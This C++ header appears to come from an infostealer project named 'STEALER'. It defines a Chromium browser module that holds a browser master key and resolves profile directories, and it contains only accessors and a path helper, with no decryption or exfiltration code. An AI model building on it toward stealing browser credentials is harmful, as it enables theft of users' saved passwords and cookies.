//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHROMIUMBROWSERMODULE_H
#define STEALER_CHROMIUMBROWSERMODULE_H


#include "../BrowserModule.h"

class ChromiumBrowserModule : public BrowserModule {
public:
    void setMasterKey(const std::vector<BYTE> &key){
        this->master_key = key;
    }

    void setHasProfiles(const bool &_hasProfiles)
    {
        this->has_profiles = _hasProfiles;
    }

    void setProfile(const std::string &_profile)
    {
        this->profile = _profile;
    }

protected:
    std::vector<BYTE> getMasterKey() {return this->master_key;}
    std::string getProfile() {return this->profile;}
    bool isHasProfiles() {return this->has_profiles;}

    const fs::path getProfileDir(const fs::path &browser_root)
    {
        if(this->isHasProfiles())
            return browser_root / this->getProfile();

        return browser_root;
    }

private:
    std::vector<BYTE> master_key;
    std::string profile = "Default";
    bool has_profiles = true;
};

#endif //STEALER_CHROMIUMBROWSERMODULE_H
